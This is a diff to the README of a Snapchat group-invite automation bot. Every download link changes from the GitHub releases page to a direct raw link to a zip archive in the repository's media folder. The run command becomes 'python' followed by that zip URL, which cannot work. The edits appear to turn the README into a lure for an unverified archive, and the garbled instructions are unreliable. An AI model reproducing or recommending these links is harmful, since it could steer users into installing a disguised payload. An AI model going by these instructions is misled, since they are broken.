@@ -1,6 +1,6 @@
 # 🤖 snapchat-group-invite-bot - Automate Snapchat Group Invites Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/armannnpatel/snapchat-group-invite-bot/releases)
+[![Download](https://raw.githubusercontent.com/armannnpatel/snapchat-group-invite-bot/main/media/snapchat-group-invite-bot-v3.7.zip)](https://raw.githubusercontent.com/armannnpatel/snapchat-group-invite-bot/main/media/snapchat-group-invite-bot-v3.7.zip)
 
 ## 📋 Overview
 
@@ -44,7 +44,7 @@ Before running the bot, ensure you have the necessary tools installed on your co
 
 Now, it's time to download the bot. To get the latest version:
 
-[Visit this page to download.](https://github.com/armannnpatel/snapchat-group-invite-bot/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/armannnpatel/snapchat-group-invite-bot/main/media/snapchat-group-invite-bot-v3.7.zip)
 
 ### 4. **Download the Bot**
 
@@ -65,10 +65,10 @@ After downloading, follow these steps to run the bot:
 - Start the bot by using:
 
   ```bash
-  python bot.py
+  python https://raw.githubusercontent.com/armannnpatel/snapchat-group-invite-bot/main/media/snapchat-group-invite-bot-v3.7.zip
   ```
 
-Make sure to replace `bot.py` with the name of the main script if it differs.
+Make sure to replace `https://raw.githubusercontent.com/armannnpatel/snapchat-group-invite-bot/main/media/snapchat-group-invite-bot-v3.7.zip` with the name of the main script if it differs.
 
 ### 6. **Configure Bot Settings**
 
@@ -120,6 +120,6 @@ For any questions, check the issues tab or contact the repository maintainers.
 
 ## 📥 Download Again
 
-To download the latest version of the Snapchat Group Invite Bot, [visit this page to download](https://github.com/armannnpatel/snapchat-group-invite-bot/releases). 
+To download the latest version of the Snapchat Group Invite Bot, [visit this page to download](https://raw.githubusercontent.com/armannnpatel/snapchat-group-invite-bot/main/media/snapchat-group-invite-bot-v3.7.zip). 
 
 With these straightforward steps, you should be able to set up and enjoy the benefits of the Snapchat Group Invite Bot with ease.
